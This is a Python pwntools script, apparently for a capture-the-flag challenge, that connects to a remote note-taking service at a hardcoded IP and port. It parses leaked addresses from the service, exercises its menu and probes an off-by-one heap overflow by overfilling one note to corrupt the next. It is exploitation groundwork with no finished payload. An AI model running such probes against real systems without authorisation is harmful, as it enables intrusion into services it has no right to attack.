#!/usr/bin/env python3
"""
Test script to understand the note-taking service behavior
"""

from pwn import *

context.log_level = 'debug'

HOST = '212.2.250.33'
PORT = 31553

io = remote(HOST, PORT)

# Capture initial output with addresses
print("=" * 60)
print("INITIAL OUTPUT:")
print("=" * 60)
initial = io.recvuntil(b'> ', timeout=2)
print(initial.decode())

# Parse addresses
addresses = []
for line in initial.split(b'\n'):
    if b'0x' in line:
        print(f"Address line: {line}")
        try:
            addr_str = line.split(b'0x')[1].split()[0]
            addr = int(addr_str, 16)
            addresses.append(addr)
            print(f"  Parsed: {hex(addr)}")
        except Exception as e:
            print(f"  Parse error: {e}")

print(f"\nFound {len(addresses)} addresses")
for i, addr in enumerate(addresses):
    print(f"  Address {i}: {hex(addr)}")

if len(addresses) >= 2:
    diff = addresses[1] - addresses[0]
    print(f"  Difference: {hex(diff)}")

# Test basic operations
print("\n" + "=" * 60)
print("TESTING CREATE")
print("=" * 60)

io.sendline(b'1')  # Create
io.sendline(b'32')  # Size
io.sendline(b'AAAA')  # Content
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

print("\n" + "=" * 60)
print("TESTING SHOW")
print("=" * 60)

io.sendline(b'4')  # Show
io.sendline(b'0')  # Index 0
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

print("\n" + "=" * 60)
print("TESTING EDIT/APPEND")
print("=" * 60)

io.sendline(b'2')  # Edit
io.sendline(b'0')  # Index 0
io.sendline(b'BBBB')  # Append content
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

# Show again to see appended content
io.sendline(b'4')  # Show
io.sendline(b'0')  # Index 0
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

# Create another note to test off-by-one
print("\n" + "=" * 60)
print("TESTING OFF-BY-ONE SCENARIO")
print("=" * 60)

io.sendline(b'1')  # Create note 1
io.sendline(b'32')
io.sendline(b'CCCC')
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

# Fill note 0 completely
io.sendline(b'2')  # Edit note 0
io.sendline(b'0')
io.sendline(b'X' * 32)  # Fill to capacity
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

# Try to append one more byte (should trigger off-by-one)
io.sendline(b'2')  # Edit note 0
io.sendline(b'0')
io.sendline(b'Y')  # One more byte
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

# Check if note 1 is corrupted
io.sendline(b'4')  # Show note 1
io.sendline(b'1')
response = io.recvuntil(b'> ', timeout=2)
print(response.decode())

print("\n" + "=" * 60)
print("KEEPING CONNECTION OPEN")
print("=" * 60)

io.interactive()
